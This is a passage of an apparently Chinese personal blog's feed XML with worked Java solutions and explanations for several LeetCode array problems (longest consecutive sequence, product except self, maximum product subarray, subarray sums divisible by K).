class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(nums.length == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        TreeSet&lt;Integer&gt; treeSet = <span class="keyword">new</span> TreeSet&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> num:nums)&#123;</span><br><span class="line">            treeSet.add(num);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> lastNum = treeSet.pollFirst();</span><br><span class="line">        <span class="keyword">int</span> curLen = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> maxLen = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num:treeSet) &#123;</span><br><span class="line">            <span class="keyword">if</span>(lastNum + <span class="number">1</span> == num)&#123;</span><br><span class="line">                curLen++;</span><br><span class="line">                lastNum = num;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(lastNum == num)&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                maxLen = curLen&gt;maxLen?curLen:maxLen;</span><br><span class="line">                lastNum = num;</span><br><span class="line">                curLen = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        maxLen = curLen&gt;maxLen?curLen:maxLen;</span><br><span class="line">        <span class="keyword">return</span> maxLen;</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20200606102923384.png" alt="image-20200606102923384"></p><h2><span id="方法四-使用并查集思想">方法四、使用并查集思想</span></h2><p>并查集包含两个动作，查找和合并。</p><p>此处查找为查找根节点。合并为合并两个相邻节点。但是其实合并没必要，所以将并查集做了优化。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;Integer,Integer&gt; set = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    HashMap&lt;Integer,Integer&gt; count = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> num)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(set.containsKey(num-<span class="number">1</span>))&#123;</span><br><span class="line">            <span class="keyword">int</span> value = set.get(num-<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span>(value != num-<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="comment">//代表找过</span></span><br><span class="line">                set.put(num,value);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//代表没找过</span></span><br><span class="line">                value = find(value);</span><br><span class="line">                set.put(num, value);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> num;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">longestConsecutive</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums.length == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> num:nums)&#123;</span><br><span class="line">            set.put(num,num);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> maxLen = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i:set.keySet())&#123;</span><br><span class="line">            <span class="keyword">int</span> parent = set.get(i);</span><br><span class="line">            <span class="keyword">if</span>(parent == i)&#123;</span><br><span class="line">                parent = find(i);</span><br><span class="line">            &#125;</span><br><span class="line">            Integer value = count.get(parent);</span><br><span class="line">            <span class="keyword">if</span>(value == <span class="keyword">null</span>)&#123;</span><br><span class="line">                value = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            value += <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span>(value &gt; maxLen)&#123;</span><br><span class="line">                maxLen = value;</span><br><span class="line">            &#125;</span><br><span class="line">            count.put(parent,value);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxLen;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20200606133225708.png" alt="image-20200606133225708"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;给定一个未排序的整数数组，找出最长连续序列的长度。&lt;/p&gt;
&lt;p&gt;要求算法的时间复杂度为 O(n)。&lt;/p&gt;
&lt;p&gt;示例:&lt;/p&gt;
&lt;p&gt;输入: [100, 4, 200, 1, 3, 2]&lt;br&gt;输出: 4&lt;br&gt;解释: 最长连续序列是 [1, 2, 3, 4]。它的长度为 4。&lt;/p&gt;
&lt;p&gt;来源：力扣（LeetCode）&lt;br&gt;链接：&lt;a href=&quot;https://leetcode-cn.com/problems/longest-consecutive-sequence&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://leetcode-cn.com/problems/longest-consecutive-sequence&lt;/a&gt;&lt;br&gt;著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。&lt;/p&gt;
    
    </summary>
    
    
      <category term="算法" scheme="http://blog.ydq6.com/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="算法" scheme="http://blog.ydq6.com/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>Leetcode238-除自身以外数组的乘积</title>
    <link href="http://blog.ydq6.com/%E7%AE%97%E6%B3%95/Leetcode238-%E9%99%A4%E8%87%AA%E8%BA%AB%E4%BB%A5%E5%A4%96%E6%95%B0%E7%BB%84%E7%9A%84%E4%B9%98%E7%A7%AF/"/>
    <id>http://blog.ydq6.com/%E7%AE%97%E6%B3%95/Leetcode238-%E9%99%A4%E8%87%AA%E8%BA%AB%E4%BB%A5%E5%A4%96%E6%95%B0%E7%BB%84%E7%9A%84%E4%B9%98%E7%A7%AF/</id>
    <published>2020-06-04T02:09:54.000Z</published>
    <updated>2020-06-04T03:38:55.024Z</updated>
    
    <content type="html"><![CDATA[<p>给你一个长度为 n 的整数数组 nums，其中 n &gt; 1，返回输出数组 output ，其中 output[i] 等于 nums 中除 nums[i] 之外其余各元素的乘积。</p><p>示例:</p><p>输入: [1,2,3,4]<br>输出: [24,12,8,6]</p><p>提示：题目数据保证数组之中任意元素的全部前缀元素和后缀（甚至是整个数组）的乘积都在 32 位整数范围内。</p><p>说明: 请不要使用除法，且在 O(n) 时间复杂度内完成此题。</p><p>进阶：<br>你可以在常数空间复杂度内完成这个题目吗？（ 出于对空间复杂度分析的目的，输出数组不被视为额外空间。）</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/product-of-array-except-self" target="_blank" rel="noopener">https://leetcode-cn.com/problems/product-of-array-except-self</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p><a id="more"></a><p>要求除本身外数组的乘积，只需要将数字左右的乘积相乘即可。假设</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dp[<span class="string">i</span>][<span class="symbol">j</span>]为nums[i]<span class="emphasis">*nums[i+1]*</span>...*nums[j];</span><br></pre></td></tr></table></figure><p>所以</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sums[<span class="string">i</span>]=dp[<span class="string">0</span>][<span class="symbol">i-1</span>]*dp[<span class="string">i+1</span>][<span class="symbol">len</span>]</span><br></pre></td></tr></table></figure><p>状态转移方程：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dp[<span class="string">i</span>][<span class="symbol">j</span>]=dp[<span class="string">i</span>][<span class="symbol">j-1</span>]*nums[j]</span><br></pre></td></tr></table></figure><p>方向是从0~len.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] productExceptSelf(<span class="keyword">int</span>[] nums) &#123;</span><br><span class="line">        <span class="keyword">int</span> len = nums.length;</span><br><span class="line">        <span class="keyword">int</span>[][] dp = <span class="keyword">new</span> <span class="keyword">int</span>[len][len];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; len;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=i;j&lt;len;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(j == i) &#123;</span><br><span class="line">                    dp[i][i] = nums[i];</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    dp[i][j] = dp[i][j - <span class="number">1</span>] * nums[j];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span>[] sum = <span class="keyword">new</span> <span class="keyword">int</span>[len];</span><br><span class="line">        sum[<span class="number">0</span>]=dp[<span class="number">1</span>][len-<span class="number">1</span>];</span><br><span class="line">        sum[len-<span class="number">1</span>]=dp[<span class="number">0</span>][len-<span class="number">2</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>;i &lt; len-<span class="number">1</span>;i++)&#123;</span><br><span class="line">            sum[i] = dp[<span class="number">0</span>][i-<span class="number">1</span>]*dp[i+<span class="number">1</span>][len-<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这样虽然对，但是超出内存限制了。题目要求o(1)时间复杂度，所以需要重新调整过。</p><p>看下状态转移方程表格：<br><img src="/assets/image-20200604105752184.png" alt="image-20200604105752184"></p><p>再看下sum是怎么计算的：</p><p><img src="/assets/image-20200604110018249.png" alt="image-20200604110018249"></p><p>可以重新算状态转移表格：</p><p><img src="/assets/image-20200604111653691.png" alt="image-20200604111653691"></p><p>其实很简单的一个表格，用几个中间变量表示即可。</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">leftValue 代表左面计算乘积，初始化为<span class="number">1</span>。</span><br><span class="line">rightValue 代表右面计算乘积，初始化为<span class="number">1.</span></span><br><span class="line"></span><br><span class="line">注意右面乘积的计算只需要从num[j+<span class="number">1</span>]*...num[len<span class="number">-1</span>]即可，</span><br><span class="line">但是左面计算乘积需要记录上一次的左面乘积，这样就可以防止重复计算。</span><br><span class="line">所以用lastLeftValue代表上次计算的左面乘积。则leftValue=lastLeftValue*nums[j<span class="number">-1</span>]</span><br></pre></td></tr></table></figure><p>所以最后的代码为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> len = nums.length;</span><br><span class="line"><span class="keyword">int</span>[] sum = <span class="keyword">new</span> <span class="keyword">int</span>[len];</span><br><span class="line"><span class="keyword">int</span> lastLeftValue = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span>;i &lt; len;i++)&#123;</span><br><span class="line">    <span class="keyword">int</span> leftValue = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> rightValue = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(i == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j =i+<span class="number">1</span>;j&lt;len;j++)&#123;</span><br><span class="line">            rightValue *= nums[j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(i == len-<span class="number">1</span>)&#123;</span><br><span class="line">        leftValue = lastLeftValue*nums[i-<span class="number">1</span>];</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        leftValue = lastLeftValue*nums[i-<span class="number">1</span>];</span><br><span class="line">        lastLeftValue = leftValue;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j =i+<span class="number">1</span>;j&lt;len;j++)&#123;</span><br><span class="line">            rightValue *= nums[j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sum[i] = leftValue*rightValue;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> sum;</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20200604113840186.png" alt="image-20200604113840186"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;给你一个长度为 n 的整数数组 nums，其中 n &amp;gt; 1，返回输出数组 output ，其中 output[i] 等于 nums 中除 nums[i] 之外其余各元素的乘积。&lt;/p&gt;
&lt;p&gt;示例:&lt;/p&gt;
&lt;p&gt;输入: [1,2,3,4]&lt;br&gt;输出: [24,12,8,6]&lt;/p&gt;
&lt;p&gt;提示：题目数据保证数组之中任意元素的全部前缀元素和后缀（甚至是整个数组）的乘积都在 32 位整数范围内。&lt;/p&gt;
&lt;p&gt;说明: 请不要使用除法，且在 O(n) 时间复杂度内完成此题。&lt;/p&gt;
&lt;p&gt;进阶：&lt;br&gt;你可以在常数空间复杂度内完成这个题目吗？（ 出于对空间复杂度分析的目的，输出数组不被视为额外空间。）&lt;/p&gt;
&lt;p&gt;来源：力扣（LeetCode）&lt;br&gt;链接：&lt;a href=&quot;https://leetcode-cn.com/problems/product-of-array-except-self&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://leetcode-cn.com/problems/product-of-array-except-self&lt;/a&gt;&lt;br&gt;著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。&lt;/p&gt;
    
    </summary>
    
    
      <category term="算法" scheme="http://blog.ydq6.com/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="算法" scheme="http://blog.ydq6.com/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>Leetcode152-乘积最大子数组</title>
    <link href="http://blog.ydq6.com/%E7%AE%97%E6%B3%95/Leetcode152-%E4%B9%98%E7%A7%AF%E6%9C%80%E5%A4%A7%E5%AD%90%E6%95%B0%E7%BB%84/"/>
    <id>http://blog.ydq6.com/%E7%AE%97%E6%B3%95/Leetcode152-%E4%B9%98%E7%A7%AF%E6%9C%80%E5%A4%A7%E5%AD%90%E6%95%B0%E7%BB%84/</id>
    <published>2020-06-03T03:17:50.000Z</published>
    <updated>2020-06-04T01:54:35.542Z</updated>
    
    <content type="html"><![CDATA[<p>给你一个整数数组 nums ，请你找出数组中乘积最大的连续子数组（该子数组中至少包含一个数字），并返回该子数组所对应的乘积。</p><p>示例 1:</p><p>输入: [2,3,-2,4]<br>输出: 6<br>解释: 子数组 [2,3] 有最大乘积 6。<br>示例 2:</p><p>输入: [-2,0,-1]<br>输出: 0<br>解释: 结果不能为 2, 因为 [-2,-1] 不是子数组。</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/maximum-product-subarray" target="_blank" rel="noopener">https://leetcode-cn.com/problems/maximum-product-subarray</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p><a id="more"></a><p>假设dp[j] 为从以nums[j]结尾的最大的乘积和</p><p>分析一下，其实</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dp[j] 和[j<span class="number">-1</span>]无关</span><br><span class="line">e.g. a=[<span class="number">1</span>,<span class="number">-2</span>,<span class="number">3</span>,<span class="number">-4</span>]</span><br><span class="line">dp[<span class="number">2</span>]=<span class="number">3</span></span><br><span class="line">dp[<span class="number">3</span>]=<span class="number">24</span></span><br></pre></td></tr></table></figure><p>对于当前数num=nums[j]。</p><p>若num&gt;0。则希望乘一个最大的整数</p><p>若num&lt;0，则希望乘一个最小的负数。</p><p>所以对于dp[j]应该维护两个数组，最大正数数组dpmax，最小负数数组min。</p><p>$$ dpmax[j] = max(dpmax[j-1]<em>nums[j],dpmin[j-1]</em>nums[j],nums[j])$$<br>$$ dpmin[j] = min(dpmax[j-1]<em>nums[j],dpmin[j-1]</em>nums[j],nums[j])$$</p><p>再简化一下用两个变量dpmax,dpmin节省空间复杂度：</p><p>$$dpmax=max(dpmax<em>nums[j],dpmin</em>nums[j],nums[j])$$</p><p>$$ dpmin = min(dpmax<em>nums[j],dpmin</em>nums[j],nums[j])$$</p><p>用maxValue记录最大值。</p><p>如果dpmax&gt;maxValue则，更新最大值。</p><p>代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxProduct</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> dpmax,dpmin,maxValue;</span><br><span class="line">        dpmax = nums[<span class="number">0</span>];</span><br><span class="line">        dpmin = nums[<span class="number">0</span>];</span><br><span class="line">        maxValue = dpmax;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>;i &lt; nums.length;i++)&#123;</span><br><span class="line">            <span class="keyword">int</span> tmpValue1 = dpmax*nums[i];</span><br><span class="line">            <span class="keyword">int</span> tmpValue2 = dpmin*nums[i];</span><br><span class="line">            dpmax = Math.max(Math.max(tmpValue1,tmpValue2),nums[i]);</span><br><span class="line">            dpmin = Math.min(Math.min(tmpValue1,tmpValue2),nums[i]);</span><br><span class="line">            <span class="keyword">if</span>(dpmax&gt;maxValue)&#123;</span><br><span class="line">                maxValue = dpmax;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxValue;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20200604095416178.png" alt="image-20200604095416178"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;给你一个整数数组 nums ，请你找出数组中乘积最大的连续子数组（该子数组中至少包含一个数字），并返回该子数组所对应的乘积。&lt;/p&gt;
&lt;p&gt;示例 1:&lt;/p&gt;
&lt;p&gt;输入: [2,3,-2,4]&lt;br&gt;输出: 6&lt;br&gt;解释: 子数组 [2,3] 有最大乘积 6。&lt;br&gt;示例 2:&lt;/p&gt;
&lt;p&gt;输入: [-2,0,-1]&lt;br&gt;输出: 0&lt;br&gt;解释: 结果不能为 2, 因为 [-2,-1] 不是子数组。&lt;/p&gt;
&lt;p&gt;来源：力扣（LeetCode）&lt;br&gt;链接：&lt;a href=&quot;https://leetcode-cn.com/problems/maximum-product-subarray&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://leetcode-cn.com/problems/maximum-product-subarray&lt;/a&gt;&lt;br&gt;著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。&lt;/p&gt;
    
    </summary>
    
    
      <category term="算法" scheme="http://blog.ydq6.com/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="算法" scheme="http://blog.ydq6.com/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>Leetcode974-和可被K整除的子数组</title>
    <link href="http://blog.ydq6.com/uncategorized/Leetcode974-%E5%92%8C%E5%8F%AF%E8%A2%ABK%E6%95%B4%E9%99%A4%E7%9A%84%E5%AD%90%E6%95%B0%E7%BB%84/"/>
    <id>http://blog.ydq6.com/uncategorized/Leetcode974-%E5%92%8C%E5%8F%AF%E8%A2%ABK%E6%95%B4%E9%99%A4%E7%9A%84%E5%AD%90%E6%95%B0%E7%BB%84/</id>
    <published>2020-05-27T01:25:07.000Z</published>
    <updated>2020-05-27T02:59:15.943Z</updated>
    
    <content type="html"><![CDATA[<p>给定一个整数数组 A，返回其中元素之和可被 K 整除的（连续、非空）子数组的数目。</p><p>示例：</p><p>输入：A = [4,5,0,-2,-3,1], K = 5<br>输出：7<br>解释：<br>有 7 个子数组满足其元素之和可被 K = 5 整除：<br>[4, 5, 0, -2, -3, 1], [5], [5, 0], [5, 0, -2, -3], [0], [0, -2, -3], [-2, -3]</p><p><strong>提示：</strong></p><ol><li><code>1 &lt;= A.length &lt;= 30000</code></li><li><code>-10000 &lt;= A[i] &lt;= 10000</code></li><li><code>2 &lt;= K &lt;= 10000</code></li></ol><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/subarray-sums-divisible-by-k" target="_blank" rel="noopener">https://leetcode-cn.com/problems/subarray-sums-divisible-by-k</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p><a id="more"></a><p>这道题是求连续非空子数组和的问题，所以可以想到用前缀数组和问题，前缀数组：</p><p>$$preSum[i-1]=A[0]+A[1]+…+A[i-1]$$</p><p>$$preSum[j]=A[0]+A[1]+…A[j]$$</p><p>所以：非空子数组[i,j]和为：</p><p>$$preSum[j]-preSum[i-1]=A[i]+A[i+2]+…+A[j] i&lt;=j$$</p><p>特殊的非空子数组[0,j]的和为</p><p>$$ preSum[j]=A[0]+A[1]+…A[j]$$.</p><p>所以问题转化为求i,j试得其满足$$(preSum[j]-preSum[i])$k==0$$</p><p>而</p><p>$$  presum[i]=\begin{cases}A[0],\quad i=0\presum[i-1]+A[i],\quad i\geq 1 \end{cases}$$</p><p>所以先用O(n)求出preSum[i],然后用o(n**2)求出preSum[j]-preSum[i]即可。</p><p>空间复杂度为O(n)。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">subarraysDivByK</span><span class="params">(<span class="keyword">int</span>[] A, <span class="keyword">int</span> K)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(A.length == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span>[] preSum = <span class="keyword">new</span> <span class="keyword">int</span>[A.length];</span><br><span class="line">        preSum[<span class="number">0</span>] = A[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;A.length;i++)&#123;</span><br><span class="line">            preSum[i] = preSum[i-<span class="number">1</span>] + A[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;A.length;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=i;j&lt;A.length;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(i == <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (preSum[j] % K == <span class="number">0</span>) &#123;</span><br><span class="line">                        sum++;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">if</span>((preSum[j]-preSum[i-<span class="number">1</span>])%K==<span class="number">0</span>)&#123;</span><br><span class="line">                        sum++;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>但是这样做超时了。</p><p>再思考下，其实这和两数和题相似，实则是两数差问题，遍历一次即可，两数差modK==0。其实将数hash后看下map中是否有相同的值，有即找出一对差。</p><p>遍历时，先看下map中有没有自己需要的值presum[i] mod K。如果有则计算出有多少个需要的，然后再map[presum[i] mod K]++。如果没有自己需要的值，则将自己的hash值放入:map[presum[i] mod K] = 1。</p><p>除此之外，还有一种特殊情况：加上本身modK等于0的preSum数量。</p><p><img src="/assets/image-20200527105045137.png" alt="image-20200527105045137"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;给定一个整数数组 A，返回其中元素之和可被 K 整除的（连续、非空）子数组的数目。&lt;/p&gt;
&lt;p&gt;示例：&lt;/p&gt;
&lt;p&gt;输入：A = [4,5,0,-2,-3,1], K = 5&lt;br&gt;输出：7&lt;br&gt;解释：&lt;br&gt;有 7 个子数组满足其元素之和可被 K = 5 整除：&lt;br&gt;[4, 5, 0, -2, -3, 1], [5], [5, 0], [5, 0, -2, -3], [0], [0, -2, -3], [-2, -3]&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;提示：&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;1 &amp;lt;= A.length &amp;lt;= 30000&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-10000 &amp;lt;= A[i] &amp;lt;= 10000&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;2 &amp;lt;= K &amp;lt;= 10000&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;来源：力扣（LeetCode）&lt;br&gt;链接：&lt;a href=&quot;https://leetcode-cn.com/problems/subarray-sums-divisible-by-k&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://leetcode-cn.com/problems/subarray-sums-divisible-by-k&lt;/a&gt;&lt;br&gt;著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Leetcode139-单词拆分</title>
    <link href="http://blog.ydq6.com/%E7%AE%97%E6%B3%95/Leetcode139-%E5%8D%95%E8%AF%8D%E6%8B%86%E5%88%86/"/>
    <id>http://blog.ydq6.com/%E7%AE%97%E6%B3%95/Leetcode139-%E5%8D%95%E8%AF%8D%E6%8B%86%E5%88%86/</id>
    <published>2020-05-26T02:13:10.000Z</published>
    <updated>2020-06-17T08:04:19.912Z</updated>
    
